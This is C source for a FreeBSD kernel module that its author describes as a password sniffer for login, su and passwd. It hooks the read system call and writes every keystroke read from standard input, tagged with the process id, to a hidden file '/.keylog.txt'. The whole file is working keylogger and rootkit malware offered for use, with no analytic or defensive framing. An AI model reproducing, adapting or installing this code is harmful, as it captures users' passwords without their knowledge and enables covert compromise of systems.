/* 	simple read_hook sniffer for freebsd, collects passwords from:
	login / su / passwd

	ported to FreeBSD 9.3

	Warning. While unloading the system is crashing *sometimes*, better do not unload ;)
	by dash

*/
#include <sys/types.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/syscallsubr.h>
#include <sys/limits.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/pcpu.h>
#include <sys/proc.h>
#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/file.h>
#include <sys/sysproto.h>

// you might want to change this one
#define LOGPATH "/.keylog.txt"

static int keylog_write(struct thread *td, int fd, char *line, u_int len)
{
  struct uio auio;
  struct iovec aiov;
  int err;

  bzero(&aiov, sizeof(aiov));
  bzero(&auio, sizeof(auio));
 
  aiov.iov_base = line;
  aiov.iov_len = len;
 
  auio.uio_iov = &aiov;
  auio.uio_offset = 0;
  auio.uio_segflg = UIO_SYSSPACE;
  auio.uio_rw = UIO_WRITE;
  auio.uio_iovcnt = 1;
  auio.uio_resid = len;

  auio.uio_td = td;

  printf(aiov.iov_base);
  err = kern_writev(td, fd, &auio);

  return err;
}


static int keylog_close(struct thread *td, int fd)
{
  if(fd)
  {
	struct close_args fdtmp;
	fdtmp.fd = fd;
	return kern_close(td, fdtmp.fd);
  }
  return 0;
}

static int keylog_open(struct thread *td, int *fd, char *path)
{
  int error;
  error = kern_open(td, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (!error)
  {
	*fd = td->td_retval[0];
  }
  return error;
}

// read_hook for collecting the passwords
static int read_hook(struct thread *td, void *syscall_args)
{
	struct read_args {
		int fd;
		void *buf;
		size_t nbyte; } *uap;

	uap = (struct read_args *)syscall_args;

	int error;
	char buf[1];
	int done;
	char string[64];
	int fd = -1;

	copyinstr(uap->buf,buf,1,&done);
	error = sys_read(td, syscall_args);
	
	if (error || (!uap->nbyte) || (uap->nbyte >1) || (uap-> fd != 0))
		return(error); 

	copyinstr(uap->buf,buf,1,&done);

	// open up file
	keylog_open(curthread, &fd, LOGPATH);

	// prepare string, processid, character and character decimal value
	sprintf(string, "[%d]:%c(%d)\n", td->td_proc->p_pid, buf[0],buf[0]);
	
	// write data to filedescriptor
	keylog_write(curthread, fd, string, strlen(string));

	// close file
	keylog_close(curthread, fd);

	return(error);
}

static int load_handler(module_t mod, int what, void *arg)
{
		int err = 0;

		switch(what)
		{
		case MOD_LOAD:
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			break;

		case MOD_UNLOAD:
			sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
			break;

		default:
			err = EINVAL;
			break;
		}

		return(err);
}

// a struct that holds basic data on the module
static moduledata_t keylog_mod =
{
		"schlussel",
		load_handler,
		NULL
};

DECLARE_MODULE(schlussel, keylog_mod, SI_SUB_KLD, SI_ORDER_ANY); 
